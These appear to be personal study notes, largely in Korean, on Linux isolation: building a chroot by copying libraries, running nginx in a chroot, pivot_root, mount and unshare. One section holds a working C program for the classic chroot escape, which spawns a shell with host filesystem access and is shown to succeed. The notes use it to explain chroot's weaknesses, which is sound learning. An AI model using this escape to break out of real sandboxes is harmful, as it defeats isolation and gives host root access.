# chroot



https://shop.kt.com/unify/mobile.do?&category=usedphone

https://download.virtualbox.org/virtualbox/7.0.0_BETA1/

https://velog.io/@sblee/m1-mac%EC%97%90%EC%84%9C-virtualBox-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0

- man ldd # ldd prints the shared libraries required
- wman vdso # *-vdso 는 커널레벨에서 제공되는 공유 라이브러리입니다.  

~~~
   13  cp /lib/aarch64-linux-gnu/libtinfo.so.6 new-root/lib/
   14  ldd /usr/bin/bash
   15  cp /lib/aarch64-linux-gnu/libdl.so.2 new-root/lib/
   16  cp /lib/aarch64-linux-gnu/libc.so.6 new-root/lib/
   17  cp /lib/ld-linux-aarch64.so.1 new-root/lib/
   18  chroot new-root /bin/bash
   19  which ls
   20  ldd /usr/bin/ls
   21  cp /lib/aarch64-linux-gnu/libselinux.so.1 new-root/lib/
   22  cp /lib/aarch64-linux-gnu/libc.so.6 new-root/lib
   23  cp /lib/aarch64-linux-gnu/libc.so.6 new-root/lib/
   24  cp /lib/ld-linux-aarch64.so.1 new-root/lib/
   25  cp /lib/aarch64-linux-gnu/libpcre2-8.so.0 new-root/lib/
   26  cp /lib/aarch64-linux-gnu/libdl.so.2 new-root/lib/
   27  cp /lib/aarch64-linux-gnu/libpthread.so.0 new-root/lib/
   28  chroot new-root /bin/bash
   29  ls
   30  cd new-root/lib/
   31  ls
   32  cd ..
   33  ls
   34  cd bin
   35  ls
   36  cd ..
   37  ls
   38  cd lib
   39  ls
   40  ll
   41  ldd /usr/bin/ls
   42  ldd /bin/ls
   43  ls
   44  cd
   45  cd /
   46  ls
   47  cp /lib/aarch64-linux-gnu/libselinux.so.1 /new-root/lib/
   48  cp /lib/aarch64-linux-gnu/libc.so.6 /new-root/lib/
   49  cp /lib/ld-linux-aarch64.so.1 /new-root/lib/
   50  cp /lib/aarch64-linux-gnu/libpcre2-8.so.0 /new-root/lib/
   51  cp /lib/aarch64-linux-gnu/libdl.so.2 /new-root/lib/
   52  cp /lib/aarch64-linux-gnu/libpthread.so.0 /new-root/lib/
   53  chroot /new-root/ /bin/bash
   54  which mkdir
   55  ldd /usr/bin/mk
   56  ldd /usr/bin/mkdir
   57  cp /lib/aarch64-linux-gnu/libc.so.6 /new-root/lib
   58  cp /lib/aarch64-linux-gnu/libc.so.6 /new-root/lib/
   59  cp /lib/ld-linux-aarch64.so.1 /new-root/lib/
   60  cp /lib/aarch64-linux-gnu/libpcre2-8.so.0 /new-root/lib/
   61  cp /lib/aarch64-linux-gnu/libdl.so.2 /new-root/lib/
   62  cp /lib/aarch64-linux-gnu/libpthread.so.0 /new-root/lib/
   63  chroot new-root /bin/bash
   64  ls
   65  cd new-root/lib/
   66  ls
   67  ls -;
   68  ls -l
   69  cd /
   70  ldd /bin/cat
   71  cp /lib/aarch64-linux-gnu/libc.so.6 /new-root/lib/
   72  cp /lib/ld-linux-aarch64.so.1 /new-root/lib/
   73  chroot new-root /bin/bash
   74  cp /usr/bin/ls /new-root/bin/
   75  cp /usr/bin/mkdir /new-root/bin/
   76  cp /usr/bin/cat /new-root/bin/
   77  chroot new-root bin
   78  chroot new-root /bin/bash
   79  history
~~~













### nginx 테스트

- nginx image 를 다운로드 받고
- chroot로 접근한 후 nginx를 실행시킬 수 있다.

~~~sh
$ docker export $(docker create nginx:latest) | tar -C nginx-root -xvf -
~~~

~~~sh
cd /tmp
chroot nginx-root /bin/sh # chroot로 실행

# ls
bin   dev		   docker-entrypoint.sh  home  media  opt   root  sbin	sys  usr
boot  docker-entrypoint.d  etc			 lib   mnt    proc  run   srv	tmp  var
~~~

~~~sh
nginx -g "daemon off;" # foreground 실행
curl localhost # nginx 페이지 조회
~~~





### 경로를 변경하는 코드 작성

~~~c
#include <sys/stat.h>
#include <unistd.h>

int main(void) {
	mkdir(".out", 0755);
	chroot(".out");
	chdir("../../../../../");
	chroot(".");
	
	return execl("/bin/sh", "-i", NULL);
}
~~~





### chroot 에서 탈출

- host filesystem에 접근 가능하다 (host root 권한 취득)

~~~sh
$ chroot new-root /bin/bash
$ ./escaape
$ ls
bin   dev	etc   lib	  media  new-root  proc  root2	sbin  srv	sys  usr
boot  escape.c	home  lost+found  mnt	 opt	   root  run	snap  swap.img	tmp  var
~~~



### chroot 문제점

isolation 안됨 - host filesystem, process tree, network, ipc 등에 접근 가능

root 권한 사용가능

resource 제한 안됨 : cpu, memory. i/o, network



## pivot_root

pivot_root [new] [old]

~~~
mount -t [filesystem type][device_name][directory - mount point]
root filesystem tree 에 다른 파일시스템을 붙이는명령
~~~

-t : filesystem type ( -t tmpfs)

-o:  옵션 ( -o size=1m)

/proc/filesystems 에서 지원하느 filesystem type 참고 가능 





### unshare

- 새로운 네임스페이스를 만들고 나서 프로그램을 실행하는 명령어.

~~~
unshare [options][program [arguments]]
creates new namespaces and then
executes the specified program (default: ${SEHLL})
~~~







~~~
$ mkdir ./new-root
$ mount -n -t tmpfs -o size=800M none ./new-root
$ mount | grep new-root
~~~



- unshare -m : mount namespace 를 분리하여 프로세스를 실행해 준다.
- pivot_root는 root filesystem의 mount point 를 변경하기 때문에
- 호스트에 영향을 주지 않기 위해서 unshare -m 을 실행해서 호스트와 mount namespace 를 분리하였다.

~~~
cd new_root
unshare -m
~~~



~~~
pivot_root . old-root
cd /
ls
cd / && cd ../../../../
lso
~~~





























